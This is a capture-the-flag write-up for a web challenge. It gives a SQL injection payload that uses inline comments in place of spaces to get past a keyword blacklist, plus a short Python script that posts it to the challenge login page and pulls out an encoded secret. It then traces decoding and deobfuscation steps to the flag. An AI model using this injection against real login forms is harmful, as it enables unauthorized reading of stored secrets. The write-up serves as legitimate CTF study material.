## POC

After reviewing [main.py](dist/main.py) and [schema.sql](dist/schema.sql), it became obvious that the objective was to log in as someone with a secret. However, there are numerous blacklists in place. After conducting research, I crafted a payload to bypass the restrictions and successfully obtained the secret.

```sql
a'/**/union/**/select/**/secret/**/from/**/login_details--
```

![1](images/1.png)

The secret was encrypted in base64.

![2](images/2.png)

Then I decrypted the secret, and I got JavaScript code, but it was obfuscated.

![3](images/3.png)

I used a deobfuscator tool to deobfuscate the code and got plain JavaScript code.

Again, I got text encrypted in base64.

![5](images/5.png)

I decrypted the text and got a link to: [https://github.com/ishan-surana/challenge/](https://github.com/ishan-surana/challenge/)

After a little bit of searching, I found the flag in an edited comment in [https://github.com/ishan-surana/challenge/issues/4](https://github.com/ishan-surana/challenge/issues/4)

I think it was really weird because it was a web challenge, but I needed to search through the GitHub repository.

## solve.py

```python
import re
import requests

url = "https://imgy-gal.nitectf.live/login"

data = {
    "username": "a'/**/union/**/select/**/secret/**/from/**/login_details--",
    "password": "test"
}

r = requests.post(url, data=data)
encrypted = re.findall(r"(ey.*fQ)", r.text)[0]

print(encrypted)
```
